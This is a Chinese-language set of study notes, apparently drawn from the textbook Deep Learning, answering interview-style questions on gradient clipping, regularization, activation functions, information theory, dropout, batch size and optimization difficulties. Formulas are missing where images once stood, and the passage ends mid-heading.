这里以tf.clip_by_global_norm为例： 1234567 To perform the clipping, the values `t_list[i]` are set to: t_list[i] * clip_norm / max(global_norm, clip_norm)where: global_norm = sqrt(sum([l2norm(t)**2 for t in t_list])) 用法： 12345678 train_op = tf.train.AdamOptimizer()params = tf.trainable_variables()gradients = tf.gradients(loss, params)clip_norm = 100clipped_gradients, global_norm = tf.clip_by_global_norm(gradients, clip_norm)optimizer_op = train_op.apply_gradients(zip(clipped_gradients, params)) clip_norm 的设置视 loss 的大小而定，如果比较大，那么可以设为 100 或以上，如果比较小，可以设为 10 或以下。 良好的参数初始化策略也能缓解梯度爆炸问题（权重正则化） 1. 如何设置网络的初始值？* 使用线性整流激活函数，如 ReLU 等 神经网络（MLP）的万能近似定理* 《深度学习》 6.4.1 万能近似性质和深度 一个前馈神经网络如果具有至少一个非线性输出层，那么只要给予网络足够数量的隐藏单元，它就可以以任意的精度来近似任何从一个有限维空间到另一个有限维空间的函数。 神经网络中，深度与宽度的关系，及其表示能力的差异** 《深度学习》 6.4 - 架构设计；这一节的内容比较分散，想要更好的回答这个问题，需要理解深度学习的本质——学习多层次组合（ch1.2），这才是现代深度学习的基本原理。 隐藏层的数量称为模型的深度，隐藏层的维数（单元数）称为该层的宽度。 万能近似定理表明一个单层的网络就足以表达任意函数，但是该层的维数可能非常大，且几乎没有泛化能力；此时，使用更深的模型能够减少所需的单元数，同时增强泛化能力（减少泛化误差）。参数数量相同的情况下，浅层网络比深层网络更容易过拟合。 在深度神经网络中，引入了隐藏层（非线性单元），放弃了训练问题的凸性，其意义何在？** 《深度学习》 6 深度前馈网络（引言） &amp; 6.3 隐藏单元 放弃训练问题的凸性，简单来说，就是放弃寻求问题的最优解。 非线性单元的加入，使训练问题不再是一个凸优化问题。这意味着神经网络很难得到最优解，即使一个只有两层和三个节点的简单神经网络，其训练优化问题仍然是 NP-hard 问题 (Blum &amp; Rivest, 1993). 深度学习的核心问题——NP-hard问题 - 百家号 但即使如此，使用神经网络也是利大于弊的： 人类设计者只需要寻找正确的函数族即可，而不需要去寻找精确的函数。 使用简单的梯度下降优化方法就可以高效地找到足够好的局部最小值 增强了模型的学习/拟合能力，如原书中所说“ maxout 单元可以以任意精度近似任何凸函数”。至于放弃凸性后的优化问题可以在结合工程实践来不断改进。 “似乎传统的优化理论结果是残酷的，但我们可以通过工程方法和数学技巧来尽量规避这些问题，例如启发式方法、增加更多的机器和使用新的硬件（如GPU）。” Issue #1 · elviswf/DeepLearningBookQA_cn 稀疏表示，低维表示，独立表示* 《深度学习》 5.8 无监督学习算法 无监督学习任务的目的是找到数据的“最佳”表示。“最佳”可以有不同的表示，但是一般来说，是指该表示在比本身表示的信息更简单的情况下，尽可能地保存关于 x 更多的信息。 低维表示、稀疏表示和独立表示是最常见的三种“简单”表示：1）低维表示尝试将 x 中的信息尽可能压缩在一个较小的表示中；2）稀疏表示将数据集嵌入到输入项大多数为零的表示中；3）独立表示试图分开数据分布中变化的来源，使得表示的维度是统计独立的。 这三种表示不是互斥的，比如主成分分析（PCA）就试图同时学习低维表示和独立表示。 表示的概念是深度学习的核心主题之一。 局部不变性（平滑先验）及其在基于梯度的学习上的局限性* 《深度学习》 5.11.2 局部不变性与平滑正则化 局部不变性：函数在局部小区域内不会发生较大的变化。 为了更好地泛化，机器学习算法需要由一些先验来引导应该学习什么类型的函数。 其中最广泛使用的“隐式先验”是平滑先验（smoothness prior），也称局部不变性先验（local constancy prior）。许多简单算法完全依赖于此先验达到良好的（局部）泛化，一个极端例子是 k-最近邻系列的学习算法。 但是仅依靠平滑先验不足以应对人工智能级别的任务。简单来说，区分输入空间中 O(k) 个区间，需要 O(k) 个样本，通常也会有 O(k) 个参数。最近邻算法中，每个训练样本至多用于定义一个区间。类似的，决策树也有平滑学习的局限性。 以上问题可以总结为：是否可以有效地表示复杂的函数，以及所估计的函数是否可以很好地泛化到新的输入。该问题的一个关键观点是，只要我们通过额外假设生成数据的分布来建立区域间的依赖关系，那么 O(k) 个样本足以描述多如 O(2^k) 的大量区间。通过这种方式，能够做到非局部的泛化。 一些其他的机器学习方法往往会提出更强的，针对特定问题的假设，例如周期性。通常，神经网络不会包含这些很强的针对性假设——深度学习的核心思想是假设数据由因素或特征组合产生，这些因素或特征可能来自一个层次结构的多个层级。许多其他类似的通用假设进一步提高了深度学习算法。这些很温和的假设允许了样本数目和可区分区间数目之间的指数增益。深度的分布式表示带来的指数增益有效地解决了维数灾难带来的挑战 指数增益：《深度学习》 ch6.4.1、ch15.4、ch15.5 为什么交叉熵损失相比均方误差损失能提高以 sigmoid 和 softmax 作为激活函数的层的性能？** 《深度学习》 6.6 小结 中提到了这个结论，但是没有给出具体原因（可能在前文）。 简单来说，就是使用均方误差（MSE）作为损失函数时，会导致大部分情况下梯度偏小，其结果就是权重的更新很慢，且容易造成“梯度消失”现象。而交叉熵损失克服了这个缺点，当误差大的时候，权重更新就快，当误差小的时候，权重的更新才慢。 具体推导过程如下： https://blog.csdn.net/guoyunfei20/article/details/78247263 - CSDN 博客 这里给出了一个具体的例子 分段线性单元（如 ReLU）代替 sigmoid 的利弊*** 《深度学习》 6.6 小结 当神经网络比较小时，sigmoid 表现更好； 在深度学习早期，人们认为应该避免具有不可导点的激活函数，而 ReLU 不是全程可导/可微的 sigmoid 和 tanh 的输出是有界的，适合作为下一层的输入，以及整个网络的输出。实际上，目前大多数网络的输出层依然使用的 sigmoid（单输出） 或 softmax（多输出）。 为什么 ReLU 不是全程可微也能用于基于梯度的学习？——虽然 ReLU 在 0 点不可导，但是它依然存在左导数和右导数，只是它们不相等（相等的话就可导了），于是在实现时通常会返回左导数或右导数的其中一个，而不是报告一个导数不存在的错误。 一阶函数：可微==可导 对于小数据集，使用整流非线性甚至比学习隐藏层的权重值更加重要 (Jarrett et al., 2009b) 当数据增多时，在深度整流网络中的学习比在激活函数具有曲率或两侧饱和的深度网络中的学习更容易 (Glorot et al., 2011a)：传统的 sigmoid 函数，由于两端饱和，在传播过程中容易丢弃信息 ReLU 的过程更接近生物神经元的作用过程 饱和（saturate）现象：在函数图像上表现为变得很平，对输入的微小改变会变得不敏感。 https://blog.csdn.net/code_lr/article/details/51836153 - CSDN博客 答案总结自该知乎问题：https://www.zhihu.com/question/29021768 在做正则化过程中，为什么只对权重做正则惩罚，而不对偏置做权重惩罚* 《深度学习》 7.1 参数范数惩罚 在神经网络中，参数包括每一层仿射变换的权重和偏置，我们通常只对权重做惩罚而不对偏置做正则惩罚。 精确拟合偏置所需的数据通常比拟合权重少得多。每个权重会指定两个变量如何相互作用。我们需要在各种条件下观察这两个变量才能良好地拟合权重。而每个偏置仅控制一个单变量。这意味着，我们不对其进行正则化也不会导致太大的方差。另外，正则化偏置参数可能会导致明显的欠拟合。 列举常见的一些范数及其应用场景，如 L0、L1、L2、L∞、Frobenius等范数** 《深度学习》 2.5 范数（介绍） L0: 向量中非零元素的个数 L1: 向量中所有元素的绝对值之和 L2: 向量中所有元素平方和的开放 其中 L1 和 L2 范数分别是 Lp (p&gt;=1) 范数的特例： L∞: 向量中最大元素的绝对值，也称最大范数 Frobenius 范数：相当于作用于矩阵的 L2 范数 范数的应用：正则化——权重衰减/参数范数惩罚 权重衰减的目的 限制模型的学习能力，通过限制参数 θ 的规模（主要是权重 w 的规模，偏置 b 不参与惩罚），使模型偏好于权值较小的目标函数，防止过拟合。 《深度学习》 7.1 参数范数惩罚 L1 和 L2 范数的异同*** 《深度学习》 7.1.1 L2 参数正则化 &amp; 7.1.2 - L1 参数正则化 相同点 限制模型的学习能力，通过限制参数的规模，使模型偏好于权值较小的目标函数，防止过拟合。 不同点 L1 正则化可以产生稀疏权值矩阵，即产生一个稀疏模型，可以用于特征选择；一定程度上防止过拟合 L2 正则化主要用于防止模型过拟合 L1 适用于特征之间有关联的情况；L2 适用于特征之间没有关联的情况 机器学习中正则化项L1和L2的直观理解 - CSDN博客 为什么 L1 正则化可以产生稀疏权值，L2 正则化可以防止过拟合？** 为什么 L1 正则化可以产生稀疏权值，而 L2 不会？ 添加 L1 正则化，相当于在 L1范数的约束下求目标函数 J 的最小值，下图展示了二维的情况： 图中 J 与 L 首次相交的点就是最优解。L1 在和每个坐标轴相交的地方都会有“角”出现（多维的情况下，这些角会更多），在角的位置就会产生稀疏的解。而 J 与这些“角”相交的机会远大于其他点，因此 L1 正则化会产生稀疏的权值。 类似的，可以得到带有 L2正则化的目标函数在二维平面上的图形，如下： 相比 L1，L2 不会产生“角”，因此 J 与 L2 相交的点具有稀疏性的概率就会变得非常小。 机器学习中正则化项L1和L2的直观理解 - CSDN博客 为什么 L1 和 L2 正则化可以防止过拟合？ L1 &amp; L2 正则化会使模型偏好于更小的权值。 简单来说，更小的权值意味着更低的模型复杂度，也就是对训练数据的拟合刚刚好（奥卡姆剃刀），不会过分拟合训练数据（比如异常点，噪声），以提高模型的泛化能力。 此外，添加正则化相当于为模型添加了某种先验（限制），规定了参数的分布，从而降低了模型的复杂度。模型的复杂度降低，意味着模型对于噪声与异常点的抗干扰性的能力增强，从而提高模型的泛化能力。 机器学习中防止过拟合的处理方法 - CSDN博客 简单介绍常用的激活函数，如 sigmoid、relu、softplus、tanh、RBF 及其应用场景*** 《深度学习》 6.3 隐藏单元 整流线性单元（ReLU） 整流线性单元（ReLU）通常是激活函数较好的默认选择。 整流线性单元易于优化，因为它们和线性单元非常类似。线性单元和整流线性单元的唯一区别在于整流线性单元在其一半的定义域上输出为零。这使得只要整流线性单元处于激活状态，它的导数都能保持较大。它的梯度不仅大而且一致。整流操作的二阶导数几乎处处为 0，并且在整流线性单元处于激活状态时，它的一阶导数处处为 1。这意味着相比于引入二阶效应的激活函数来说，它的梯度方向对于学习来说更加有用。 ReLU 的拓展 ReLU 的三种拓展都是基于以下变型： ReLU 及其扩展都是基于一个原则，那就是如果它们的行为更接近线性，那么模型更容易优化。 绝对值整流（absolute value rectification） 固定 α == -1，此时整流函数即一个绝对值函数 绝对值整流被用于图像中的对象识别 (Jarrett et al., 2009a)，其中寻找在输入照明极性反转下不变的特征是有意义的。 渗漏整流线性单元（Leaky ReLU, Maas et al., 2013） 固定 α 为一个类似于 0.01 的小值 参数化整流线性单元（parametric ReLU, PReLU, He et al., 2015） 将 α 作为一个参数学习 maxout 单元 (Goodfellow et al., 2013a) maxout 单元 进一步扩展了 ReLU，它是一个可学习的多达 k 段的分段函数 关于 maxout 网络的分析可以参考论文或网上的众多分析，下面是 Keras 中的实现： 12345 # input shape: [n, input_dim]# output shape: [n, output_dim]W = init(shape=[k, input_dim, output_dim])b = zeros(shape=[k, output_dim])output = K.max(K.dot(x, W) + b, axis=1) 深度学习（二十三）Maxout网络学习 - CSDN博客 sigmoid 与 tanh（双曲正切函数） 在引入 ReLU 之前，大多数神经网络使用 sigmoid 激活函数： 或者 tanh（双曲正切函数）： tanh 的图像类似于 sigmoid，区别在其值域为 (-1, 1). 这两个函数有如下关系： sigmoid 函数要点： sigmoid 常作为输出单元用来预测二值型变量取值为 1 的概率 换言之，sigmoid 函数可以用来产生伯努利分布中的参数 ϕ，因为它的值域为 (0, 1). sigmoid 函数在输入取绝对值非常大的正值或负值时会出现饱和（saturate）现象，在图像上表现为开始变得很平，此时函数会对输入的微小改变会变得不敏感。仅当输入接近 0 时才会变得敏感。 饱和现象会导致基于梯度的学习变得困难，并在传播过程中丢失信息。——为什么用ReLU代替sigmoid？ 如果要使用 sigmoid 作为激活函数时（浅层网络），tanh 通常要比 sigmoid 函数表现更好。 tanh 在 0 附近与单位函数类似，这使得训练 tanh 网络更容易些。 其他激活函数（隐藏单元） 很多未发布的非线性激活函数也能表现的很好，但没有比流行的激活函数表现的更好。比如使用 cos 也能在 MNIST 任务上得到小于 1% 的误差。通常新的隐藏单元类型只有在被明确证明能够提供显著改进时才会被发布。 线性激活函数： 如果神经网络的每一层都由线性变换组成，那么网络作为一个整体也将是线性的，这会导致失去万能近似的性质。但是，仅部分层是纯线性是可以接受的，这可以帮助减少网络中的参数。 softmax： softmax 单元常作为网络的输出层，它很自然地表示了具有 k 个可能值的离散型随机变量的概率分布。 径向基函数（radial basis function, RBF）： 在神经网络中很少使用 RBF 作为激活函数，因为它对大部分 x 都饱和到 0，所以很难优化。 softplus： [](http://www.codecogs.com/eqnedit.php?latex=g(z)=\\zeta(z)=\\log(1+\\exp(z))) softplus 是 ReLU 的平滑版本。通常不鼓励使用 softplus 函数，大家可能希望它具有优于整流线性单元的点，但根据经验来看，它并没有。 (Glorot et al., 2011a) 比较了这两者，发现 ReLU 的结果更好。 硬双曲正切函数（hard tanh）： [](http://www.codecogs.com/eqnedit.php?latex=g(z)=\\max(-1,\\min(1,a))) 它的形状和 tanh 以及整流线性单元类似，但是不同于后者，它是有界的。 Collobert, 2004 sigmoid 和 softplus 的一些性质 《深度学习》 3.10 常用函数的有用性质 Jacobian 和 Hessian 矩阵及其在深度学习中的重要性* 《深度学习》 4.3.1 梯度之上：Jacobian 和 Hessian 矩阵 信息熵、KL 散度（相对熵）与交叉熵** 《深度学习》 3.13 信息论 信息论的基本想法是一个不太可能的事件居然发生了，要比一个非常可能的事件发生，能提供更多的信息。 该想法可描述为以下性质： 非常可能发生的事件信息量要比较少，并且极端情况下，确保能够发生的事件应该没有信息量。 比较不可能发生的事件具有更高的信息量。 独立事件应具有增量的信息。例如，投掷的硬币两次正面朝上传递的信息量，应该是投掷一次硬币正面朝上的信息量的两倍。 自信息与信息熵 自信息（self-information）是一种量化以上性质的函数，定义一个事件 x 的自信息为： 当该对数的底数为 e 时，单位为奈特（nats，本书标准）；当以 2 为底数时，单位为比特（bit）或香农（shannons） 自信息只处理单个的输出。此时，用信息熵（Information-entropy）来对整个概率分布中的不确定性总量进行量化： 信息熵也称香农熵（Shannon entropy） 信息论中，记 0log0 = 0 相对熵（KL 散度）与交叉熵 P 对 Q 的 KL散度（Kullback-Leibler divergence）： KL 散度在信息论中度量的是那个直观量： 在离散型变量的情况下， KL 散度衡量的是，当我们使用一种被设计成能够使得概率分布 Q 产生的消息的长度最小的编码，发送包含由概率分布 P 产生的符号的消息时，所需要的额外信息量。 KL 散度的性质： 非负；KL 散度为 0 当且仅当P 和 Q 在离散型变量的情况下是相同的分布，或者在连续型变量的情况下是“几乎处处”相同的 不对称；D_p(q) != D_q§ 交叉熵（cross-entropy）： 信息量，信息熵，交叉熵，KL散度和互信息（信息增益） - CSDN博客 交叉熵与 KL 散度的关系： 针对 Q 最小化交叉熵等价于最小化 P 对 Q 的 KL 散度，因为 Q 并不参与被省略的那一项。 最大似然估计中，最小化 KL 散度其实就是在最小化分布之间的交叉熵。 《深度学习》 ch5.5 - 最大似然估计 如何避免数值计算中的上溢和下溢问题，以 softmax 为例* 《深度学习》 4.1 上溢与下溢 上溢：一个很大的数被近似为 ∞ 或 -∞； 下溢：一个很小的数被近似为 0 必须对上溢和下溢进行数值稳定的一个例子是 softmax 函数： 因为 softmax 解析上的函数值不会因为从输入向量减去或加上标量而改变， 于是一个简单的解决办法是对 x： 减去 max(x_i) 导致 exp 的最大参数为 0，这排除了上溢的可能性。同样地，分母中至少有一个值为 1=exp(0) 的项，这就排除了因分母下溢而导致被零除的可能性。 注意：虽然解决了分母中的上溢与下溢问题，但是分子中的下溢仍可以导致整体表达式被计算为零。此时如果计算 log softmax(x) 时，依然要注意可能造成的上溢或下溢问题，处理方法同上。 当然，大多数情况下，这是底层库开发人员才需要注意的问题。 训练误差、泛化误差；过拟合、欠拟合；模型容量，表示容量，有效容量，最优容量的概念； 奥卡姆剃刀原则* 《深度学习》 5.2 容量、过拟合和欠拟合 过拟合的一些解决方案*** 参数范数惩罚（Parameter Norm Penalties） 数据增强（Dataset Augmentation） 提前终止（Early Stopping） 参数绑定与参数共享（Parameter Tying and Parameter Sharing） Bagging 和其他集成方法 Dropout 批标准化（Batch Normalization） 高斯分布的广泛应用的原因** 《深度学习》 3.9.3 高斯分布 高斯分布（Gaussian distribution） 高斯分布，即正态分布（normal distribution）： [](http://www.codecogs.com/eqnedit.php?latex=N(x;\\mu,\\sigma2)=\\sqrt\\frac{1}{2\\pi\\sigma2}\\exp\\left&amp;space;(&amp;space;-\\frac{1}{2\\sigma2}(x-\\mu)2&amp;space;\\right&amp;space;)) 概率密度函数图像： 其中峰的 x 坐标由 µ 给出，峰的宽度受 σ 控制；特别的，当 µ = 0, σ = 1时，称为标准正态分布 正态分布的均值 E = µ；标准差 std = σ，方差为其平方 为什么推荐使用高斯分布？ 当我们由于缺乏关于某个实数上分布的先验知识而不知道该选择怎样的形式时，正态分布是默认的比较好的选择，其中有两个原因： 我们想要建模的很多分布的真实情况是比较接近正态分布的。中心极限定理（central limit theorem）说明很多独立随机变量的和近似服从正态分布。这意味着在实际中，很多复杂系统都可以被成功地建模成正态分布的噪声，即使系统可以被分解成一些更结构化的部分。 第二，在具有相同方差的所有可能的概率分布中，正态分布在实数上具有最大的不确定性。因此，我们可以认为正态分布是对模型加入的先验知识量最少的分布。 关于这一点的证明：《深度学习》 ch19.4.2 - 变分推断和变分学习 多维正态分布 正态分布可以推广到 n 维空间，这种情况下被称为多维正态分布。 参数 µ 仍然表示分布的均值，只不过现在是一个向量。参数 Σ 给出了分布的协方差矩阵（一个正定对称矩阵）。 表示学习、自编码器与深度学习** 《深度学习》 1 引言 表示学习： 对于许多任务来说，我们很难知道应该提取哪些特征。解决这个问题的途径之一是使用机器学习来发掘表示本身，而不仅仅把表示映射到输出。这种方法我们称之为表示学习（representation learning）。学习到的表示往往比手动设计的表示表现得更好。并且它们只需最少的人工干预，就能让AI系统迅速适应新的任务。 自编码器： 表示学习算法的典型例子是 自编码器（autoencoder）。自编码器由一个编码器（encoder）函数和一个解码器（decoder）函数组合而成。 编码器函数将输入数据转换为一种不同的表示; 解码器函数则将这个新的表示转换到原来的形式。 我们期望当输入数据经过编码器和解码器之后尽可能多地保留信息，同时希望新的表示有一些好的特性，这也是自编码器的训练目标。 深度学习： 深度学习（deep learning）通过简单的表示来表达复杂的表示，以解决表示学习中的核心问题。 深度学习模型的示意图 计算机难以理解原始感观输入数据的含义，如表示为像素值集合的图像，将一组像素映射到对象标识的函数非常复杂。深度学习将所需的复杂映射分解为一系列嵌套的简单映射（每个由模型的不同层描述）来解决这一难题。 输入展示在可见层（visible layer），这样命名的原因是因为它包含我们能观察到的变量。然后是一系列从图像中提取越来越多抽象特征的隐藏层（hidden layer），称为“隐藏”的原因是因为它们的值不在数据中给出。 模型必须确定哪些概念有利于解释观察数据中的关系。这里的图像是每个隐藏单元表示的特征的可视化。给定像素，第一隐藏层可以轻易地通过比较相邻像素的亮度来识别边缘。有了第一隐藏层描述的边缘，第二隐藏层可以容易地搜索轮廓和角。给定第二隐藏层中关于角和轮廓的图像描述，第三隐藏层可以找到轮廓和角的特定集合来检测整个特定对象。最后，根据图像描述中包含的对象部分，可以识别图像中存在的对象。 实际任务中并不一定具有这么清晰的可解释性，很多时候你并不知道每个隐藏层到底识别出了哪些特征。 学习数据的正确表示的想法是解释深度学习的一个视角。 另一个视角是深度促使计算机学习一个多步骤的计算机程序。——《深度学习》 ch1 - 引言 早期的深度学习称为神经网络，因为其主要指导思想来源于生物神经学。从神经网络向深度学习的术语转变也是因为指导思想的改变。 L1、L2 正则化与 MAP 贝叶斯推断的关系* 《深度学习》 5.6.1 最大后验 (MAP) 估计 许多正则化策略可以被解释为 MAP 贝叶斯推断： L2 正则化相当于权重是高斯先验的 MAP 贝叶斯推断 对于 L1正则化，用于正则化代价函数的惩罚项与通过 MAP 贝叶斯推断最大化的对数先验项是等价的 什么是欠约束，为什么大多数的正则化可以使欠约束下的欠定问题在迭代过程中收敛* 《深度学习》 7.3 正则化与欠约束问题 为什么考虑在模型训练时对输入 (隐藏单元或权重) 添加方差较小的噪声？* 《深度学习》 7.5 噪声鲁棒性 对于某些模型而言，向输入添加方差极小的噪声等价于对权重施加范数惩罚 (Bishop, 1995a,b)。 在一般情况下，注入噪声比简单地收缩参数强大。特别是噪声被添加到隐藏单元时会更加强大，Dropout 方法正是这种做法的主要发展方向。 另一种正则化模型的噪声使用方式是将其加到权重。这项技术主要用于循环神经网络 (Jim et al., 1996; Graves, 2011)。这可以被解释为关于权重的贝叶斯推断的随机实现。贝叶斯学习过程将权重视为不确定的，并且可以通过概率分布表示这种不确定性。向权重添加噪声是反映这种不确定性的一种实用的随机方法。 多任务学习、参数绑定和参数共享*** 45. 迁移学习相关概念 多任务学习 《深度学习》 7.7 多任务学习 多任务学习 (Caruana, 1993) 是通过合并多个任务中的样例（可以视为对参数施加软约束）来提高泛化的一种方式。 正如额外的训练样本能够将模型参数推向具有更好泛化能力的值一样，当模型的一部分被多个额外的任务共享时，这部分将被约束为良好的值（如果共享合理），通常会带来更好的泛化能力。 多任务学习中一种普遍形式： 多任务学习在深度学习框架中可以以多种方式进行，该图展示了一种普遍形式：任务共享相同输入但涉及不同语义的输出。 在该示例中，额外假设顶层隐藏单元 h(1) 和 h(2) 专用于不同的任务——分别预测 y(1) 和 y(2)，而一些中间层表示 h(shared) 在所有任务之间共享；h(3) 表示无监督学习的情况。 这里的基本假设是存在解释输入 x 变化的共同因素池，而每个任务与这些因素的子集相关联。 该模型通常可以分为两类相关的参数： 具体任务的参数（只能从各自任务的样本中实现良好的泛化） 所有任务共享的通用参数（从所有任务的汇集数据中获益）——参数共享 因为共享参数，其统计强度可大大提高（共享参数的样本数量相对于单任务模式增加的比例），并能改善泛化和泛化误差的范围 (Baxter, 1995)。 参数共享仅当不同的任务之间存在某些统计关系的假设是合理（意味着某些参数能通过不同任务共享）时才会发生这种情况 参数绑定和参数共享 《深度学习》 7.9 参数绑定和参数共享 参数绑定： 有时，我们可能无法准确地知道应该使用什么样的参数，但我们根据相关领域和模型结构方面的知识得知模型参数之间应该存在一些相关性。 考虑以下情形：我们有两个模型执行相同的分类任务（具有相同类别），但输入分布稍有不同。 形式地，我们有参数为 w(A) 的模型 A 和参数为 w(B) 的模型 B。这两种模型将输入映射到两个不同但相关的输出： y(A) = f(x;w(A)) 和 y(B) = f(x;w(B)) 可以想象，这些任务会足够相似（或许具有相似的输入和输出分布），因此我们认为模型参数 w(A) 和 w(B) 应彼此靠近。具体来说，我们可以使用以下形式的参数范数惩罚（这里使用的是 L2 惩罚，也可以使用其他选择）： [](http://www.codecogs.com/eqnedit.php?latex=\\Omega&amp;space;(w{(A)},w{(B)})=\\left&amp;space;|&amp;space;w{(A)}-w{(B)}&amp;space;\\right&amp;space;|^2_2) 参数共享是这个思路下更流行的做法——强迫部分参数相等 和正则化参数使其接近（通过范数惩罚）相比，参数共享的一个显著优点是能够“减少内存”——只有参数（唯一一个集合）的子集需要被存储在内存中，特别是在 CNN 中。 Dropout 与 Bagging 集成方法的关系，Dropout 带来的意义与其强大的原因*** Bagging 集成方法 《深度学习》 7.11 Bagging 和其他集成方法 集成方法： 其主要想法是分别训练几个不同的模型，然后让所有模型表决测试样例的输出。这是机器学习中常规策略的一个例子，被称为模型平均（model averaging）。采用这种策略的技术被称为集成方法。 模型平均（model averaging）奏效的原因是不同的模型通常不会在测试集上产生完全相同的误差。平均上， 集成至少与它的任何成员表现得一样好，并且如果成员的误差是独立的，集成将显著地比其成员表现得更好。 Bagging： Bagging（bootstrap aggregating）是通过结合几个模型降低泛化误差的技术 (Breiman, 1994)。 具体来说，Bagging 涉及构造 k 个不同的数据集。每个数据集从原始数据集中重复采样构成，和原始数据集具有相同数量的样例。这意味着，每个数据集以高概率缺少一些来自原始数据集的例子，还包含若干重复的例子（更具体的，如果采样所得的训练集与原始数据集大小相同，那所得数据集中大概有原始数据集 2/3 的实例） 图像说明：该图描述了 Bagging 如何工作。假设我们在上述数据集（包含一个 8、一个 6 和一个 9）上训练数字 8 的检测器。假设我们制作了两个不同的重采样数据集。 Bagging 训练程序通过有放回采样构建这些数据集。第一个数据集忽略 9 并重复 8。在这个数据集上，检测器得知数字顶部有一个环就对应于一个 8。第二个数据集中，我们忽略 6 并重复 9。在这种情况下，检测器得知数字底部有一个环就对应于一个 8。这些单独的分类规则中的每一个都是不可靠的，但如果我们平均它们的输出，就能得到鲁棒的检测器，只有当 8 的两个环都存在时才能实现最大置信度。 Dropout 《深度学习》 7.12 Dropout Dropout 的意义与强大的原因： 简单来说，Dropout (Srivastava et al., 2014) 通过参数共享提供了一种廉价的 Bagging 集成近似，能够训练和评估指数级数量的神经网络。 Dropout 训练的集成包括所有从基础网络除去部分单元后形成的子网络。具体而言，只需将一些单元的输出乘零就能有效地删除一个单元。 通常，隐藏层的采样概率为 0.5，输入的采样概率为 0.8；超参数也可以采样，但其采样概率一般为 1 Dropout与Bagging的不同点： 在 Bagging 的情况下，所有模型都是独立的；而在 Dropout 的情况下，所有模型共享参数，其中每个模型继承父神经网络参数的不同子集。 在 Bagging 的情况下，每一个模型都会在其相应训练集上训练到收敛。而在 Dropout 的情况下，通常大部分模型都没有显式地被训练；取而代之的是，在单个步骤中我们训练一小部分的子网络，参数共享会使得剩余的子网络也能有好的参数设定。 权重比例推断规则： 简单来说，如果我们使用 0.5 的包含概率（keep prob），权重比例规则相当于在训练结束后将权重除 2，然后像平常一样使用模型；等价的，另一种方法是在训练期间将单元的状态乘 2。 无论哪种方式，我们的目标是确保在测试时一个单元的期望总输入与在训练时该单元的期望总输入是大致相同的（即使近半单位在训练时丢失）。 批梯度下降法（Batch SGD）更新过程中，批的大小会带来怎样的影响** 《深度学习》 8.1.3 批量算法和小批量算法 特别说明：本书中，“批量”指使用使用全部训练集；“小批量”才用来描述小批量随机梯度下降算法中用到的小批量样本；而随机梯度下降（SGD）通常指每次只使用单个样本 批的大小通常由以下几个因素决定： 较大的批能得到更精确的梯度估计，但回报是小于线性的。 较小的批能带来更好的泛化误差，泛化误差通常在批大小为 1 时最好。但是，因为梯度估计的高方差，小批量训练需要较小的学习率以保持稳定性，这意味着更长的训练时间。 可能是由于小批量在学习过程中加入了噪声，它们会有一些正则化效果 (Wilson and Martinez, 2003) 内存消耗和批的大小成正比，如果批量处理中的所有样本可以并行地处理（通常确是如此）。 在某些硬件上使用特定大小可以减少运行时间。尤其是在使用 GPU 时，通常使用 2 的幂数作为批量大小可以获得更少的运行时间。一般，2 的幂数的取值范围是 32 到 256，16 有时在尝试大模型时使用。 小批量更容易利用多核架构，但是太小的批并不会减少计算时间，这促使我们使用一些绝对最小批量 很多机器学习上的优化问题都可以分解成并行地计算不同样本上单独的更新。换言之，我们在计算小批量样本 X 上最小化 J(X) 的更新时，同时可以计算其他小批量样本上的更新。 异步并行分布式方法 -&gt; 《深度学习》 12.1.3 大规模的分布式实现 如何避免深度学习中的病态，鞍点，梯度爆炸，梯度弥散？*** 《深度学习》 8.2 神经网络优化中的挑战 病态（ill-conditioning） 《深度学习》 8.2.1 病态 什么是病态？ 神经网络优化中的病态问题 - CSDN博客 什么是 ill-conditioning 对SGD有什么影响？ - 知乎 简单来说，深度学习中的病态问题指的就是学习/优化变的困难，需要更多的迭代次数才能达到相同的精度。 病态问题普遍存在于数值优化、凸优化或其他形式的优化中 -&gt; ch4.3.1 - 梯度之上：Jacobian 和 Hessian 矩阵 更具体的，导致病态的原因是问题的条件数（condition number）非常大，其中条件数 = 函数梯度最大变化速度 / 梯度最小变化速度（对于二阶可导函数，条件数的严格定义是：Hessian矩阵最大特征值的上界 / 最小特征值的下界）。 条件数大意味着目标函数在有的地方（或有的方向）变化很快、有的地方很慢，比较不规律，从而很难用当前的局部信息（梯度）去比较准确地预测最优点所在的位置，只能一步步缓慢的逼近最优点，从而优化时需要更多的迭代次数。 如何避免病态？ 知道了什么是病态，那么所有有利于加速训练的方法都属于在避免病态，其中最主要的还是优化算法。 深度学习主要使用的优化算法是梯度下降，所以避免病态问题的关键是改进梯度下降算法： 随机梯度下降（SGD）、批量随机梯度下降 动态的学习率 带动量的 SGD 28. SGD 以及学习率的选择方法，带动量的 SGD 对于 Hessian 矩阵病态条件及随机梯度方差的影响*** 鞍点（saddle point） 对于很多高维非凸函数（神经网络）而言，局部极小值/极大值事实上都远少于另一类梯度为零的点：鞍点 什么是鞍点？ 二维和三维中的鞍点： 《深度学习》 4.3 基于梯度的优化方法 鞍点激增对于训练算法来说有哪些影响？ 对于只使用梯度信息的一阶优化算法（随机梯度下降）而言，目前情况还不清楚。不过，虽然鞍点附近的梯度通常会非常小，但是 Goodfellow et al. (2015) 认为连续的梯度下降会逃离而不是吸引到鞍点。 对于牛顿法（二阶梯度）而言，鞍点问题会比较明显。不过神经网络中很少使用二阶梯度进行优化。 长期依赖与梯度爆炸、消失 《深度学习》 10.11 优化长期依赖 当计算图变得很深时（循环神经网络），神经网络优化算法会面临的另外一个难题就是长期依赖，由于变深的结构使模型丧失了学习到先前信息的能力，让优化变得极其困难；具体来说，就是会出现梯度消失和梯度爆炸问题。 如何避免梯度爆炸？ 2. 梯度爆炸的解决办法*** 如何缓解梯度消失？ 梯度截断有助于处理爆炸的梯度，但它无助于梯度消失。 一个想法是：在展开循环架构的计算图中，沿着与弧边相关联的梯度乘积接近 1 的部分创建路径——LSTM, GRU 等门控机制正是该想法的实现。 《深度学习》 10.10 长短期记忆和其他门控 RNN 另一个想法是：正则化或约束参数，以引导“信息流”；或者说，希望梯度向量在反向传播时能维持其幅度。形式上，我们要使 [](http://www.codecogs.com/eqnedit.php?latex=(\\nabla_{h{(t)}}L)\\frac{\\partial&amp;space;h{(t)}}{\\partial&amp;space;h^{(t-1)}}) 与梯度向量 一样大。 一些具体措施： 批标准化（Batch Normalization） 31. 批标准化（Batch Normalization）的意义** 在这个目标下， Pascanu et al. (2013a) 提出了以下正则项： 这种方法的一个主要弱点是，在处理数据冗余的任务时如语言模型，它并不像 LSTM 一样有效。 SGD 以及学习率的选择方法、带动量的 SGD*** 《深度学习》 